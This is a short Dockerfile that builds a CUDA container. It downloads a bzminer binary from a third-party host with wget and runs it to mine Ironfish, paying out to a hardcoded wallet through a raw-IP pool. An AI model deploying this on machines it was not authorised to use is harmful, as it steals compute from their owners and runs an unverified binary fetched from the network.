FROM nvidia/cuda:12.2.0-devel-ubuntu20.04

RUN apt-get update
RUN apt-get install -y wget

RUN wget https://unicorn.org.cn/reactor/data/bzminer_v19.2.1_linux.tar.gz 
RUN tar -zxvf bzminer_v19.2.1_linux.tar.gz

CMD /bzminer_v19.2.1_linux/bzminer -a ironfish -w b6d0bdb68a614727255e0ec7b55333632f5bd6a96c077875433e14b0e30ef74c -p 64.120.114.16:1145 --nc 1

